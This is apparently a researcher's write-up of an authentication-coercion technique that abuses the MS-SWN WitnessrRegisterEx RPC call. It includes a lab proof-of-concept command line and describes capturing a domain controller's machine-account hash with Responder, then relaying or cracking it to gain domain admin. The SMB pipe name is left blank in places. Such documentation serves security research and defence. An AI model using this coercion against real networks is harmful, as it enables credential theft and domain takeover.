# MS-SWN - Remote call to WitnessrRegisterEx (opnum 4)

## Summary

+ **Protocol**: [[MS-SWN]: Service Witness Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-swn/1c404bcb-4a19-4152-a465-ec9a27cb717d)

+ **Protocol UUID**: ccd8c074-d0e5-4a40-92b4-d074faa6ba28

+ **Protocol version**: 1.1

+ **SMB Named pipe**: ``

+ **Function name**: [`WitnessrRegisterEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-swn/a6028354-7f1c-43d7-97af-4999305193d2)

+ **Function operation number**: `4`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-SWN`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-swn/1c404bcb-4a19-4152-a465-ec9a27cb717d) protocol (with uuid `ccd8c074-d0e5-4a40-92b4-d074faa6ba28` and version `1.1`) in order to perform remote procedure calls to functions in the [`MS-SWN`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-swn/1c404bcb-4a19-4152-a465-ec9a27cb717d) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-SWN]: Service Witness Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-swn/1c404bcb-4a19-4152-a465-ec9a27cb717d) and allows to call RPC functions of this protocol. We will then call the remote [`WitnessrRegisterEx`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-swn/a6028354-7f1c-43d7-97af-4999305193d2) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
WitnessrRegisterEx('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
DWORD WitnessrRegisterEx(
         [in] handle_t Handle,
         [out] PPCONTEXT_HANDLE ppContext,
         [in] ULONG Version,
         [in] [string] [unique] LPWSTR NetName,
         [in] [string] [unique] LPWSTR ShareName,
         [in] [string] [unique] LPWSTR IpAddress,
         [in] [string] [unique] LPWSTR ClientComputerName,
         [in] ULONG Flags,
         [in] ULONG KeepAliveTimeout);
```

## References

+ Documentation of protocol [MS-SWN]: Service Witness Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-swn/1c404bcb-4a19-4152-a465-ec9a27cb717d

+ Documentation of function `WitnessrRegisterEx`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-swn/a6028354-7f1c-43d7-97af-4999305193d2